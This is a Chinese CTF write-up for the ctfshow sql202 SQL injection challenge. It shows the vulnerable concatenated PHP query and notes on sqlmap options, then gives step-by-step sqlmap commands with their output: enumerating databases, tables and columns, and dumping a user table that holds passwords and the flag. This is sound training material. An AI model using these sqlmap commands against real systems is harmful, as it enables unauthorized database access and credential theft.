## ctfshow-sql202

#####  sqlmap的使用手册: https://github.com/sqlmapproject/sqlmap/wiki/Usage

#####  比较详细的使用教程 : https://www.freebuf.com/sectool/164608.html



```
 要求：
 使用--data 调整sqlmap的请求方式
```



```mysql
查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."';";

返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```



```python
–user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入
–referer=REFERER sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入
使用–data 调整sqlmap的请求方式
data即为post请求

```



```
注入顺序
1.获取当前MySQL中的所有数据库
2.获取当前数据库名字
3.获取数据库下的数据表
4.获取表下的列名
5.导出数据
```



```mysql
查询数据库

sqlmap.py -u http://c7d63066-93d7-4469-9f0e-d2bd52fe0cf4.chall.ctf.show:8080/api/ --data "id=1" --referer="ctf.show" --dbs

[14:38:09] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:38:10] [INFO] fetching database names
available databases [5]:
[*] ctfshow_web
[*] information_schema
[*] mysql
[*] performance_schema
[*] test


查表
sqlmap.py -u http://c7d63066-93d7-4469-9f0e-d2bd52fe0cf4.chall.ctf.show:8080/api/ --data "id=1" --referer="ctf.show" -D ctfshow_web --tables

[14:39:58] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:39:58] [INFO] fetching tables for database: 'ctfshow_web'
Database: ctfshow_web
[1 table]
+--------------+
| ctfshow_user |
+--------------+


查列名
sqlmap.py -u http://c7d63066-93d7-4469-9f0e-d2bd52fe0cf4.chall.ctf.show:8080/api/ --data "id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user --columns

[14:40:54] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:40:54] [INFO] fetching columns for table 'ctfshow_user' in database 'ctfshow_web'
Database: ctfshow_web
Table: ctfshow_user
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| pass     | varchar(255) |
| username | varchar(255) |
+----------+--------------+

查内容
sqlmap.py -u http://c7d63066-93d7-4469-9f0e-d2bd52fe0cf4.chall.ctf.show:8080/api/ --data "id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user --dump


[14:42:08] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.11, Nginx 1.16.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:42:08] [INFO] fetching columns for table 'ctfshow_user' in database 'ctfshow_web'
[14:42:08] [INFO] fetching entries for table 'ctfshow_user' in database 'ctfshow_web'
Database: ctfshow_web
Table: ctfshow_user
[21 entries]
+----+-----------------------------------------------+----------+
| id | pass                                          | username |
+----+-----------------------------------------------+----------+
| 1  | admin__                                       | admin    |
| 2  | 111                                           | user1    |
| 3  | 222                                           | user2    |
| 4  | passwordAUTO                                  | userAUTO |
| 5  | passwordAUTO                                  | userAUTO |
| 6  | passwordAUTO                                  | userAUTO |
| 7  | passwordAUTO                                  | userAUTO |
| 8  | passwordAUTO                                  | userAUTO |
| 9  | passwordAUTO                                  | userAUTO |
| 10 | passwordAUTO                                  | userAUTO |
| 11 | passwordAUTO                                  | userAUTO |
| 12 | passwordAUTO                                  | userAUTO |
| 13 | passwordAUTO                                  | userAUTO |
| 14 | passwordAUTO                                  | userAUTO |
| 15 | passwordAUTO                                  | userAUTO |
| 16 | passwordAUTO                                  | userAUTO |
| 17 | passwordAUTO                                  | userAUTO |
| 18 | passwordAUTO                                  | userAUTO |
| 19 | passwordAUTO                                  | userAUTO |
| 20 | passwordAUTO                                  | userAUTO |
| 21 | ctfshow{cd699284-0101-4e50-ac2d-c0232cb5d594} | flag     |
+----+-----------------------------------------------+----------+
```

